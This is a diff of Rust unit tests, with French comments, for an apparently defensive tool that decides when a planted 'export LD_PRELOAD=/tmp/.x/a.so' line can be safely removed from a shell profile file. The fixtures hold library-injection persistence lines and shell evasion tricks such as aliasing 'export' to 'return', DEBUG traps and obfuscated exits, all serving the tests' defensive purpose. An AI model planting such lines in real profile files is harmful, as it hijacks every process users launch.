-        // Un numéro hors du fichier ne fait rien tomber, et n'admet rien de plus.
-        assert_eq!(retrait_decoupe(sh, loin.as_bytes(), &[1, 99]), None);
+        // Un numéro hors du fichier ne fait rien tomber, et n'admet rien de plus ; une seule des deux lignes laisse le
+        // NOM lu ailleurs (ronde 6) : refusé.
+        assert_eq!(retrait_decoupe(sh, loin.as_bytes(), &[1, 4, 99]), None);
+        assert_eq!(retrait_decoupe(sh, loin.as_bytes(), &[1, 99]), Some(Decoupe::Shell));
         assert_eq!(retrait_decoupe(sh, suite.as_bytes(), &[99, 1]), Some(Decoupe::Shell));
+    }
+
+    /// Ronde 6 du lot 096 : seule une ligne « [export ]NOM=valeur » de la forme la plus simple, dans un voisinage qui
+    /// ne la relie à rien, se retire seule. Chaque cas refusé de la relecture (R6-1 à R6-5) et chaque règle nouvelle
+    /// a été rejoué avec bash 5.3 (« . fichier » avant et après le retrait de la ligne, script du rapport de la ronde 6) :
+    /// la sortie change (« REVEILLEE » affiché, « umask 077 » perdu, code de sortie du fichier changé) ; les témoins
+    /// admis, eux, gardent la même sortie.
+    #[test]
+    fn retrait_de_la_forme_la_plus_simple_seulement() {
+        let p = "export LD_PRELOAD=/tmp/.x/a.so";
+        let sh = "/etc/profile.d/x.sh";
+        for (contenu, n) in [
+            // R6-1 : un mot de sortie entre guillemets, ou coupé par « \ », ou venu d'une variable ; « && » en milieu
+            // de ligne.
+            ("\"return\" # LD_PRELOAD=/tmp/.x/a.so\necho REVEILLEE\n".to_string(), 0),
+            (format!("{p} && \"return\"\necho REVEILLEE\n"), 0),
+            (format!("{p} && \\return\necho REVEILLEE\n"), 0),
+            (format!("{p} && \\exit\necho REVEILLEE\n"), 0),
+            (format!("{p} && ex\\it\necho REVEILLEE\n"), 0),
+            (format!("{p} && \"exec\" true\necho REVEILLEE\n"), 0),
+            (format!("R=return\n{p} && $R\necho REVEILLEE\n"), 1),
+            // R6-2 : « ${X:?} » arrête le shell ; « set -e » et une ligne qui échoue.
+            (format!("{p}${{ZZ:?}}\necho REVEILLEE\n"), 0),
+            (format!("{p}${{ZZ?}}\necho REVEILLEE\n"), 0),
+            ("set -e\nLD_PRELOAD=/tmp/.x/a.so false\necho REVEILLEE\n".to_string(), 1),
+            (format!("set -e\n{p} && false\necho REVEILLEE\n"), 1),
+            // R6-3 : un heredoc ouvert dans « $( » (son mot de fin est la ligne retirée).
+            (format!("X=$(cat <<'{p}'\n) #\n{p}\necho dans )\numask 077\n"), 2),
+            // R6-5 : « $? » lu sur une ligne jointe par « \ » à la suivante.
+            (format!("false\n{p}\n[ \\\n$? = 0 ] || echo REVEILLEE\n"), 1),
+            // « $? » lu dans une substitution ouverte par la ligne d'après.
+            (
+                format!("false\n{p}\nX=\"$(\necho $?)\"\n[ \"$X\" = 0 ] || echo REVEILLEE\n"),
+                1,
+            ),
+            // « |& » en fin de ligne : la ligne d'après en est la suite.
+            (format!("echo abc |&\n{p}\nwc -c\n"), 1),
+            // Le fichier change ce que fait la ligne : readonly (bash --posix), local -r et set -e, alias, fonction
+            // « export », LINENO, trap DEBUG, « $'…' » qui écrit « alias ».
+            (format!("readonly LD_PRELOAD=/usr/lib/x.so\n{p}\necho REVEILLEE\n"), 1),
+            (
+                format!("set -e\nf() {{\nlocal -r LD_PRELOAD=/usr/lib/x.so\n{p}\necho REVEILLEE\n}}\nf\n"),
+                3,
+            ),
+            (format!("alias export=return\n{p}\necho REVEILLEE\n"), 1),
+            (format!("\"ali\"as export=return\n{p}\necho REVEILLEE\n"), 1),
+            (format!("export() {{ exit; }}\n{p}\necho REVEILLEE\n"), 1),
+            (format!("function export {{ exit; }}\necho a\n{p}\necho REVEILLEE\n"), 2),
+            (format!("{p}\n[ $LINENO = 2 ] || return\necho REVEILLEE\n"), 0),
+            (
+                format!(
+                    "trap '[ \"$BASH_COMMAND\" = \"{p}\" ] && n=1' DEBUG\n{p}\n[ -n \"$n\" ] && return\necho REVEILLEE\n"
+                ),
+                1,
+            ),
+            (format!("$'\\x61lias' export=return\n{p}\necho REVEILLEE\n"), 1),
+            // Le NOM posé est lu plus bas ; une variable du shell lui-même (IFS).
+            (format!("{p}\n[ -n \"$LD_PRELOAD\" ] && return\necho REVEILLEE\n"), 0),
+            (
+                format!("{p}\nprintenv LD_\"PRELOAD\" >/dev/null && return\necho REVEILLEE\n"),
+                0,
+            ),
+            (
+                "IFS=x\nset -- $(echo axb); [ $# = 2 ] && return\necho REVEILLEE\n".to_string(),
+                0,
+            ),
+            // Dernière ligne pleine après une commande gardée : le code de sortie du fichier lu changerait.
+            (format!("[ -x /nexistepas ] && /nexistepas\n{p}\n"), 1),
+            (format!("[ -x /nexistepas ] && /nexistepas\n{p}\n\n# fin\n"), 1),
+            // Hors de la forme : « $ », accent grave, « ; », « & », « < », « > », glob, « ~ », « \r », guillemet
+            // non fermé, ou valeur coupée par un blanc.
+            ("export LD_PRELOAD=$HOME/a.so\necho fin\n".to_string(), 0),
+            ("export LD_PRELOAD=`x`\necho fin\n".to_string(), 0),
+            (format!("{p};\necho fin\n"), 0),
+            (format!("{p} &\necho fin\n"), 0),
+            (format!("{p} >/dev/null\necho fin\n"), 0),
+            ("export LD_PRELOAD=/tmp/*.so\necho fin\n".to_string(), 0),
+            ("export LD_PRELOAD=~/a.so\necho fin\n".to_string(), 0),
+            (format!("{p}\r\necho fin\n"), 0),
+            ("export LD_PRELOAD=\"/tmp/a.so\necho fin\n\"\n".to_string(), 0),
+            ("export LD_PRELOAD=/a.so /b.so\necho fin\n".to_string(), 0),
+            ("export LD_PRELOAD\necho fin\n".to_string(), 0),
+            ("export -n LD_PRELOAD=/a.so\necho fin\n".to_string(), 0),
+            (format!("{p} # \"x\"\necho fin\n"), 0),
+        ] {
+            assert_eq!(
+                retrait_decoupe(sh, contenu.as_bytes(), &[n]),
+                Some(Decoupe::Shell),
+                "{contenu:?} ligne {n}"
+            );
+        }
+        for (contenu, n) in [
+            (format!("umask 077\n{p}\necho fin\n"), 1),
+            (format!("umask 077\nA=b\n{p}\n"), 2),
+            (format!("{p}\n"), 0),
+            (
+                "PATH=/usr/local/bin:/usr/bin\nexport LD_PRELOAD='/tmp/a b.so'\necho fin\n".to_string(),
+                1,
+            ),
+            ("\tLD_PRELOAD=\"/tmp/.x/a.so\" # signalée\necho fin\n".to_string(), 0),
+            (
+                "export LD_PRELOAD=/tmp/.x/a.so:/tmp/.x/b.so\n/usr/local/bin/aide --installer\n".to_string(),
+                0,
+            ),
+        ] {
+            assert_eq!(
+                retrait_decoupe(sh, contenu.as_bytes(), &[n]),
+                None,
+                "{contenu:?} ligne {n}"
+            );
+        }
+        // R6-4 : plus de `PILE_MAX` constructions ouvertes l'une dans l'autre : le reste du fichier est dans le doute,
+        // borné en mémoire ; juste sous la borne, une ligne plus bas, fermée, se juge encore.
+        let profond = |k: usize| format!("X={}\n{p}\necho fin\n", "\"$(".repeat(k));
+        assert_eq!(retrait_decoupe(sh, profond(100).as_bytes(), &[1]), Some(Decoupe::Shell));
+        let ferme = |k: usize| format!("X={}{}\n{p}\necho fin\n", "\"$(".repeat(k), ")\"".repeat(k));
+        assert_eq!(retrait_decoupe(sh, ferme(PILE_MAX / 2 - 1).as_bytes(), &[1]), None);
+        assert_eq!(
+            retrait_decoupe(sh, ferme(PILE_MAX).as_bytes(), &[1]),
+            Some(Decoupe::Shell)
+        );
+        // Au-delà de `RETRAIT_OCTETS_MAX` octets : rien n'est jugé.
+        let gros = format!("{p}\n#{}\n", "a".repeat(RETRAIT_OCTETS_MAX));
+        assert_eq!(retrait_decoupe(sh, gros.as_bytes(), &[0]), Some(Decoupe::Trop));
     }
 
     /// Ronde 5 du lot 096 (N3, N4) : « lu ligne par ligne » se décide sur le nom du fichier et de ses dossiers exacts,
